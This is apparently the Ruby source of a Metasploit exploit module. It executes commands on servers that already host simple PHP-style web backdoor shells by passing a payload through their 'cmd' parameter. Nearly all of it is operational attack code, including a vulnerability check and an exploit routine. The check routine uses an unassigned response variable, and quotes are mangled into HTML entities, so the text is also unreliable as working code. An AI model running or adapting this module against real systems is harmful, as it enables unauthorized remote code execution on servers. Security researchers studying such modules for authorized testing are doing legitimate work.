# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Simple Backdoor Shell Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits unauthenticated simple web backdoor shells by leveraging the
        common backdoor shell&#039;s CMD parameter  to execute commands. The SecLists project of
        Daniel Miessler and Jason Haddix has a lot of samples for these kind of backdoor shells
        which is categorized under Payloads.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jay Turla <@shipcod3>&#039;,
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://resources.infosecinstitute.com/checking-out-backdoor-shells/&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/danielmiessler/SecLists/tree/master/Payloads&#039; ] # Most PHP Web Backdoors Listed
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 2000,
          &#039;BadChars&#039; => &#039;&#039;,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;
            }
        },
      &#039;Platform&#039;       => %w{ unix win },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;backdoor / Unix&#039;, { &#039;Platform&#039; => &#039;unix&#039; } ],
          [&#039;backdoor / Windows&#039;, { &#039;Platform&#039; => &#039;win&#039; } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Sep 08 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path of a backdoor shell&#039;, &#039;cmd.php&#039;]),
      ],self.class)
  end

  def check
    test = Rex::Text.rand_text_alpha(8)
    http_send_command(test)
    if res && res.body =~ /#{test}/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command(cmd)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path),
      &#039;vars_get&#039; => {
        &#039;cmd&#039; => cmd
      }
    })
    unless res && res.code == 200
      fail_with(Failure::Unknown, "Failed to execute the command.")
    end
    res
  end

  def exploit
    http_send_command(payload.encoded)
  end
end

